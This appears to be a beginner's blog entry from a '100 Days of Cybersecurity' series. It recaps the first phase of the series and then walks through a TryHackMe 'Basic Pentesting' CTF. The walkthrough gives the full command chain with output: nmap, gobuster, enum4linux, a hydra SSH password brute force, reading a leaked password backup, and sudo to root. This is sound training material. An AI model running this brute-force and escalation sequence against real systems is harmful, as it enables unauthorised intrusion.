# Day 020 - Phase 1 Recap + My First CTF Attempt

> **Challenge:** 100 Days of Cybersecurity | **Phase:** Foundations → Offensive | **Difficulty:** Beginner

---

## 🧠 20 Days. Here's What I Actually Learned.

Phase 1 is done.

Not "done" as in I've memorised everything. Done as in I have the mental model that makes everything in Phase 2 make sense.

Here's a quick map of what we covered:

---

## 📋 Phase 1 Summary

| Day | Topic | The One Thing That Matters |
|-----|-------|---------------------------|
| 001 | CIA Triad | Every attack violates Confidentiality, Integrity, or Availability |
| 002 | TCP/IP | Every layer has an attack surface |
| 003 | OSI Model | Map attacks to layers - find where to defend |
| 004 | DNS | Designed in 1983 without security - still being abused today |
| 005 | Firewalls | Necessary. Never sufficient. |
| 006 | Linux | `sudo -l` and `find / -perm -4000` - run these first after any shell |
| 007 | File Permissions | One misconfigured SUID binary = root |
| 008 | Cryptography | Asymmetric to exchange keys. Symmetric to encrypt data. Both together. |
| 009 | Password Hashing | MD5 = broken. bcrypt/Argon2 = correct. Salting = mandatory. |
| 010 | PKI/TLS | The padlock = encrypted. Not = trustworthy. |
| 011 | Auth vs Authz | 401 = not authenticated. 403 = not authorised. |
| 012 | VPNs/Tor | You moved who you trust. You didn't become anonymous. |
| 013 | Nmap | Every open port is a service. Every service is a potential entry point. |
| 014 | Wireshark | HTTP traffic is fully readable. This is why HTTPS matters. |
| 015 | Attack Taxonomy | Attacks chain. Defenders need to catch one link. Attackers need all. |
| 016 | Social Engineering | The most expensive breaches start with a conversation. |
| 017 | OWASP Top 10 | Broken Access Control is #1. Most are completely preventable. |
| 018 | CVEs | The exploitation window - between patch release and patch applied - is where breaches live. |
| 019 | Home Lab | VirtualBox + Kali + Metasploitable2. You need this for everything ahead. |

---

## 🚩 First CTF Attempt - TryHackMe "Basic Pentesting"

A CTF (Capture the Flag) is a security challenge where you compromise a machine and find hidden flag files to prove you did it.

This was my first one. Here's the honest writeup.

**Room:** TryHackMe - Basic Pentesting
**Difficulty:** Easy
**Time taken:** 2.5 hours (expected: ~45 minutes)

---

### Step 1 - Recon with Nmap

```bash
nmap -sV -sC -T4 <target-ip>

# Results:
PORT     STATE SERVICE     VERSION
22/tcp   open  ssh         OpenSSH 7.2p2
80/tcp   open  http        Apache httpd 2.4.18
139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X
445/tcp  open  netbios-ssn Samba smbd 4.3.11
```

Four open ports. SSH, HTTP, and Samba (file sharing service).

Samba 4.3.11 caught my eye - older version, worth investigating.

---

### Step 2 - Web Enumeration

```bash
# Check the website first
curl http://<target-ip>

# Directory brute force
gobuster dir -u http://<target-ip> -w /usr/share/wordlists/dirb/common.txt

# Found:
/development (Status: 301)
```

Visiting `/development` revealed a note left by developers mentioning two usernames: `jan` and `kay`.

This is a classic misconfiguration - sensitive information left in a publicly accessible directory.

---

### Step 3 - SMB Enumeration

```bash
# Enumerate Samba shares
enum4linux -a <target-ip>

# Found:
Users: jan, kay
Shares: IPC$, print$
```

Confirmed usernames. Now need credentials.

---

### Step 4 - SSH Brute Force

```bash
# Brute force SSH for user 'jan' using rockyou wordlist
hydra -l jan -P /usr/share/wordlists/rockyou.txt ssh://<target-ip> -t 4

# Result:
[22][ssh] host: <target-ip>  login: jan  password: armando
```

Got credentials. Login successful.

```bash
ssh jan@<target-ip>
# Welcome to Ubuntu 16.04.4 LTS
```

---

### Step 5 - Privilege Escalation

```bash
# Who am I?
whoami    # jan
id        # uid=1001(jan) gid=1001(jan)

# What can I run as sudo?
sudo -l   # Sorry, user jan may not run sudo

# Find SUID binaries (Day 7)
find / -perm -4000 -type f 2>/dev/null

# Check kay's home directory
ls -la /home/kay/
# Found: pass.bak (readable by jan)
cat /home/kay/pass.bak
# kayisawesome
```

---

### Step 6 - Root

```bash
su kay
# Password: kayisawesome

sudo -l
# (ALL : ALL) ALL

sudo su
# root@machine:~#

cat /root/flag.txt
# flag{...}
```

**Machine rooted.**

---

## 📖 What I Got Wrong (Honest Reflection)

1. **Spent 40 minutes on the wrong rabbit hole** - tried to exploit the Apache version before checking the web content properly. Always enumerate fully before exploiting.

2. **Forgot `enum4linux` existed** - wasted time manually checking Samba. Tools exist for a reason. Know your toolkit.

3. **Overthought privilege escalation** - the answer was a readable backup file in another user's home directory. Sometimes it's simple.

**Lesson:** Methodology matters more than tool knowledge. Enumerate completely. Then exploit.

---

## 🔑 Key Takeaways

- Phase 1 gave me the vocabulary. Phase 2 is where it gets applied.
- CTFs are humbling - and that's the point. The frustration is where the learning happens.
- Full enumeration before exploitation. Always.
- The skills from Days 6, 7, and 13 appeared in this CTF within the first hour.

---

## 📚 Resources
- [TryHackMe - Basic Pentesting Room](https://tryhackme.com/room/basicpentestingjt)
- [CTFtime - upcoming CTF competitions](https://ctftime.org/)

---

## [⬅️ Day 019](../day019/) | [➡️ Day 021](../day021/)

*Part of my [100 Days of Cybersecurity](../README.md) challenge.*